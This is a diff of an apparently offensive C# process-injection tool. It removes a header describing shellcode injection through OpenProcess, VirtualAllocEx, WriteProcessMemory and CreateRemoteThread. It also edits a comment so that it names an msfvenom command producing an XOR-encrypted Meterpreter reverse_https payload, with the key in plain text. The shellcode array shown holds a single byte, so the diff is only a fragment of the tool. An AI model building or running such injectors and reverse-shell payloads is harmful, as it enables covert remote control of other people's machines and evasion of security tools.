@@ -1,14 +1,3 @@
-/* SIMPLE PROCESS INJECTION
-description: |
-	Injects shellcode into an a newly spawned remote process.
-key win32 API calls:
-  - kernel32.dll:
-    1: 'OpenProcess'
-    2: 'VirtualAllocEx (PAGE_EXECUTE_READ_WRITE)'
-    3: 'WriteProcessMemory'
-    4: 'CreateRemoteThread'
-*/
-
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -158,7 +147,7 @@ namespace SimpleProcessInjection
 
 			string key = "ARICAHACKON";
 
-			// This shellcode byte is the encrypted output from encryptor.exe
+			// This shellcode byte is the encrypted output from msfvenom -p windows/x64/meterpreter/reverse_https -f csharp --encrypt xor --encrypt-key ARICAHACKON
 			byte[] xorshellcode = new byte[1] {0xbd};
 
 			byte[] shellcode;
